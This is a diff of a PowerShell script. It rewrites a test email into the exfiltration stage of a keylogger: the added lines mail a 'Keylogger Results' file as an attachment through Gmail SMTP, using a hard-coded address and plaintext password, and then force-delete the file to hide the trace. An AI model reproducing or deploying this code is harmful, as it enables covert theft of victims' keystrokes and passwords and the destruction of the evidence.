@@ -1,10 +1,12 @@
-$MyEmail = "madman1237890026525@gmail.com"
-$SMTP= "smtp.gmail.com"
-$To = "madman1237890026525@gmail.com"
+$From = "madman1237890026525@gmail.com"
 $Pass = "Madman009"
-$Subject = "BRO!"
-$Body = "WHAT UP MR.POWERSCRIPTS?"
-$Creds = new-object Management.Automation.PSCredential $MyEmail, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-Start-Sleep 2
+$To = "madman1237890026525@gmail.com"
+$Subject = "Keylogger Results"
+$body = "Keylogger Results"
+$SMTPServer = "smtp.gmail.com"
+$SMTPPort = "587"
+$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
-Send-MailMessage -To $to -From $MyEmail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $Creds -UseSsl -Port 587 -DeliveryNotificationOption never
+
+send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
+	Remove-Item -Path $Path -force
